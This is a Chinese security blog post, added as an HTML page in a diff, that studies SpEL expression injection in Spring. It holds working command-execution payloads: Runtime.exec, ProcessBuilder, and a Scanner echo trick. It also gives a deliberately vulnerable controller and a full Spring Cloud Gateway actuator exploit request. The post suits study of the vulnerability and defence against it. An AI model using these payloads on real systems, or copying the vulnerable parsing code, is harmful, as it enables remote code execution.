@@ -1,0 +1,382 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>SpEL表达式注入漏洞学习 | 6right</title>
+
+<link rel="shortcut icon" href="https://liangyueliangyue.github.io/favicon.ico?v=1686021349967">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://liangyueliangyue.github.io/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            6right
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/friends" class="menu gt-a-link">
+                    友链
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1686021349967"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    SpEL表达式注入漏洞学习
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2022-03-09 ·
+                    </time>
+                    
+                        <a href="https://liangyueliangyue.github.io/tag/_1xjK2YDa/" class="post-tags">
+                            # Java安全
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="spel表达式注入漏洞">SpEL表达式注入漏洞</h1>
+<h2 id="前言">前言</h2>
+<p>因为前端时间的spring gateway rce正是由此导致的所以来学习一下</p>
+<h2 id="介绍">介绍</h2>
+<p>Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于统一EL，但提供了额外的功能，是方法调用和基本的字符串模板了同时SpEL是API接口的形式因为创建的，所以允许将其集成到其他应用程序和框架中。</p>
+<h2 id="环境搭建">环境搭建</h2>
+<pre><code>https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce
+</code></pre>
+<p>下载之后用idea打开等待依赖关系解决完，然后配置springboot启动项</p>
+<figure data-type="image" tabindex="1"><img src="https://img-blog.csdnimg.cn/33f49e79d5444f43acae43361add0824.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>运行后访问</p>
+<pre><code>http://localhost:9091/
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://img-blog.csdnimg.cn/ab01d4e4bbcc4a669e422b1bd3b9a33b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<h2 id="spel表达式使用">SpEL表达式使用</h2>
+<p><strong>SpEL定界符——<code>#{}</code></strong></p>
+<p>SpEL使用<code>#{}</code>作为定界符，所有在大括号中的字符都将被认为是SpEL表达式，在其中可以使用SpEL运算符、变量、引用bean及其属性和方法等。如果是 #{ 开头同时 } 结尾，就会进入到 SPEL 解析</p>
+<p>这里需要注意<code>#{}</code>和<code>${}</code>的区别：</p>
+<ul>
+<li><code>#{}</code>就是SpEL的定界符，用于指明内容未SpEL表达式并执行；</li>
+<li><code>${}</code>主要用于加载外部属性文件中的值，在Spring Boot 很早版本的一个SpEL表达式注入中就是依赖${}触发的</li>
+<li>两者可以混合使用，但是必须<code>#{}</code>在外面，<code>${}</code>在里面，如<code>#{'${}'}</code>，注意单引号是字符串类型才添加的</li>
+</ul>
+<p><strong>简单demo</strong></p>
+<pre><code class="language-java">public class Test {
+    public static void main(String[] args) {
+        //创建ExpressionParser解析表达式
+        ExpressionParser parser = new SpelExpressionParser();
+        //SpEL表达式语法设置在parseExpression()入参内
+        Expression exp = parser.parseExpression(&quot;'hello world'&quot;);
+        //执行SpEL表达式，执行的默认Spring容器是Spring本身的容器：ApplicationContext
+        Object value = exp.getValue();
+        System.out.println(value);
+    }
+}
+</code></pre>
+<p><strong>具体步骤如下：</strong></p>
+<ol>
+<li>创建解析器：SpEL 使用 ExpressionParser 接口表示解析器，提供 SpelExpressionParser 默认实现；</li>
+<li>解析表达式：使用 ExpressionParser 的 parseExpression 来解析相应的表达式为 Expression 对象；</li>
+<li>构造上下文：准备比如变量定义等等表达式需要的上下文数据；</li>
+<li>求值：通过 Expression 接口的 getValue 方法根据上下文获得表达式值；</li>
+</ol>
+<p><strong>主要接口</strong></p>
+<ul>
+<li><strong>ExpressionParser 接口</strong>：表示解析器，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpressionParser 类，使用 parseExpression 方法将字符串表达式转换为 Expression 对象，对于 ParserContext 接口用于定义字符串表达式是不是模板，及模板开始与结束字符；</li>
+<li><strong>EvaluationContext 接口</strong>：表示上下文环境，默认实现是 org.springframework.expression.spel.support 包中的 StandardEvaluationContext 类，使用 setRootObject 方法来设置根对象，使用 setVariable 方法来注册自定义变量，使用 registerFunction 来注册自定义函数等等。</li>
+<li><strong>Expression 接口</strong>：表示表达式对象，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpression，提供 getValue 方法用于获取表达式值，提供 setValue 方法用于设置对象值。</li>
+</ul>
+<h3 id="利用方法1-类类型表达式ttype"><strong>利用方法1-类类型表达式T(Type)</strong></h3>
+<p>在SpEL表达式中，使用<code>T(Type)</code>运算符会调用类的作用域和方法。换句话说，就是可以通过该类类型表达式来操作类。</p>
+<p>使用<code>T(Type)</code>来表示java.lang.Class实例，Type必须是类全限定名，但”java.lang”包除外，因为SpEL已经内置了该包，即该包下的类可以不指定具体的包名；使用类类型表达式还可以进行访问类静态方法和类静态字段。</p>
+<pre><code class="language-java">public class Test {
+    public static void main(String[] args) {
+        //创建ExpressionParser解析表达式
+        ExpressionParser parser = new SpelExpressionParser();
+        //SpEL表达式语法设置在parseExpression()入参内
+        Expression exp = parser.parseExpression(&quot;T(java.lang.Math)&quot;);
+        //执行SpEL表达式，执行的默认Spring容器是Spring本身的容器：ApplicationContext
+        Object value = exp.getValue();
+        System.out.println(value);
+    }
+}
+</code></pre>
+<p>返回了Math类</p>
+<figure data-type="image" tabindex="3"><img src="https://img-blog.csdnimg.cn/e038b3be3455444ea6989dbdf5d84f01.png" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>那么尝试直接调用Runtime类中的exec方法</p>
+<pre><code>Expression exp = parser.parseExpression(&quot;T(java.lang.Runtime).getRuntime().exec('calc')&quot;);
+</code></pre>
+<p>成功弹出了计算器</p>
+<figure data-type="image" tabindex="4"><img src="https://img-blog.csdnimg.cn/3706828834ad47709cf9ee6889b73335.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<h3 id="利用方法2-直接new对象使用">利用方法2-直接new对象使用</h3>
+<pre><code class="language-java">public class Test {
+    public static void main(String[] args) {
+        //创建ExpressionParser解析表达式
+        ExpressionParser parser = new SpelExpressionParser();
+        //SpEL表达式语法设置在parseExpression()入参内
+        Expression exp = parser.parseExpression(&quot;new java.lang.ProcessBuilder('cmd','/c','calc').start()&quot;);
+        //执行SpEL表达式，执行的默认Spring容器是Spring本身的容器：ApplicationContext
+        Object value = exp.getValue();
+        System.out.println(value);
+    }
+}
+</code></pre>
+<p>也能够命令执行</p>
+<figure data-type="image" tabindex="5"><img src="https://img-blog.csdnimg.cn/c72376657feb4e76ba06284d821d7713.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>为什么不适用Runtime类？</p>
+<p>因为Runtime类没有构造方法，只能通过getRuntime的方法去获得</p>
+<h3 id="回显问题">回显问题</h3>
+<p>模拟真实环境中SpEL注入，如何自己构造回显了</p>
+<p><strong>简单demo</strong></p>
+<pre><code class="language-java">@RestController
+@EnableAutoConfiguration
+public class Index {
+    @ResponseBody
+    @RequestMapping(value = &quot;/spel&quot;, method = {RequestMethod.GET, RequestMethod.POST})
+    public String spel(String input){
+        SpelExpressionParser parser = new SpelExpressionParser();
+        Expression expression = parser.parseExpression(input);
+        return expression.getValue().toString();
+    }
+}
+</code></pre>
+<p>这时候使用SpEL模板表达式会报错</p>
+<figure data-type="image" tabindex="6"><img src="https://img-blog.csdnimg.cn/f79ea87d5a704ec09b5324cd2f1e771c.png" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>需要换一下SpEL的写法，否则会因为没有使用模板解析表达式，在传入#{后出现报错。</p>
+<pre><code class="language-java">@RestController
+@EnableAutoConfiguration
+public class Index {
+    @ResponseBody
+    @RequestMapping(value = &quot;/spel&quot;, method = {RequestMethod.GET, RequestMethod.POST})
+    public String spel(String input){
+        SpelExpressionParser parser = new SpelExpressionParser();
+        TemplateParserContext templateParserContext = new TemplateParserContext();
+        Expression expression = parser.parseExpression(input,templateParserContext);
+        return expression.getValue().toString();
+    }
+}
+</code></pre>
+<p>成功命令执行</p>
+<figure data-type="image" tabindex="7"><img src="https://img-blog.csdnimg.cn/f894d676e33240d696dd25fd370aac36.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>现在我们尝试执行whoami</p>
+<figure data-type="image" tabindex="8"><img src="https://img-blog.csdnimg.cn/ccd315868c6143ff8fa34337e6db8697.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>返回的也只是类对象</p>
+<p>因为我们可以随意创建对象并调用方法，所以可以利用java原生类来进行构造</p>
+<p><strong>Scanner</strong></p>
+<pre><code>input=#{new java.util.Scanner(new java.lang.ProcessBuilder(&quot;cmd&quot;, &quot;/c&quot;, &quot;whoami&quot;).start().getInputStream(), &quot;GBK&quot;).useDelimiter(&quot;lyy9&quot;).next()}
+</code></pre>
+<p>原理在于Scanner#useDelimiter方法使用指定的字符串分割输出，这里给不可能出现的字符串即可，就会让所有的字符都在第一行，然后执行next方法即可获得所有输出。</p>
+<figure data-type="image" tabindex="9"><img src="https://img-blog.csdnimg.cn/e5b2ca20dc2a4c8db2fa40fdb23d5d18.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>成功回显</p>
+<h3 id="spring-gateway-rce-回显">spring gateway rce 回显</h3>
+<pre><code class="language-java">POST /actuator/gateway/routes/hacktest HTTP/1.1
+Host: 192.168.159.132:8080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+Connection: close
+Content-Type: application/json
+Content-Length: 333
+
+{
+  &quot;id&quot;: &quot;hacktest&quot;,
+  &quot;filters&quot;: [{
+    &quot;name&quot;: &quot;AddResponseHeader&quot;,
+    &quot;args&quot;: {
+      &quot;name&quot;: &quot;Result&quot;,
+      &quot;value&quot;: &quot;#{new java.util.Scanner(new java.lang.ProcessBuilder('/bin/sh','-c', 'id').start().getInputStream(), 'GBK').useDelimiter('lyy9').next()}&quot;
+    }
+  }],
+  &quot;uri&quot;: &quot;http://example.com&quot;
+}
+
+
+</code></pre>
+<p>步骤就不介绍了，可以看之前的漏洞文章，最后也能成功回显</p>
+<figure data-type="image" tabindex="10"><img src="https://img-blog.csdnimg.cn/61635e54d4314ea687bb6679d37263f3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>不过spring gateway的回显关键点并不在这，还是filter中的AddResponseHeaderGatewayFilterFactory可以向response 中写入执行结果，因此恰好满足回显要求</p>
+<figure data-type="image" tabindex="11"><img src="https://img-blog.csdnimg.cn/324966b039104db7b4548cb96d9456a6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<h2 id="漏洞原理">漏洞原理</h2>
+<p>其实就是SpEL本身带有强大功能，如果不做限制就会导致rce</p>
+<p>SimpleEvaluationContext和StandardEvaluationContext是SpEL提供的两个EvaluationContext：</p>
+<ul>
+<li>SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。</li>
+<li>StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。</li>
+</ul>
+<p>在不指定EvaluationContext的情况下默认采用的是StandardEvaluationContext，而它包含了SpEL的所有功能，在允许用户控制输入的情况下SpEL表达式是可以操作类及其方法的，可以通过类类型表达式T(Type)或者直接new来调用任意对象的任意方法，成功造成任意命令执行。</p>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://liangyueliangyue.github.io/post/lou-dong-sao-miao-qi-xue-xi/" class="post-title gt-a-link">
+                    漏洞扫描器学习
+                </a>
+            </div>
+        
+
+        
+            <span id="/post/spel-biao-da-shi-zhu-ru-lou-dong-xue-xi/" class="leancloud_visitors" data-flag-title="SpEL表达式注入漏洞学习">
+                <em class="post-meta-item-text">阅读量 </em>
+                <i class="leancloud-visitors-count">0</i>
+            </span>
+        
+
+        
+
+        
+            <script src='https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js'></script>
+
+<style>
+	div#vcomments{
+		width:100%;
+		max-width: 1000px;
+		padding: 2.5%
+	}
+</style>
+
+
+	<div id="vcomments"></div>
+
+<script>
+	new Valine({
+		el: '#vcomments',
+		appId: 'QR1YL8ep02tLdNVejam0Whhv-gzGzoHsz',
+		appKey: 'I37Ekl4E78WEw4EpQ5WRlzxL',
+		avatar: 'monsterid',
+		pageSize: 5,
+		recordIp: false,
+		placeholder: '留下你的评论！',
+		visitor: true,
+	});
+</script>
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">温润如玉</div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/liangyueliangyue" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+    </div>
+    <div>
+        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
+                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://liangyueliangyue.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
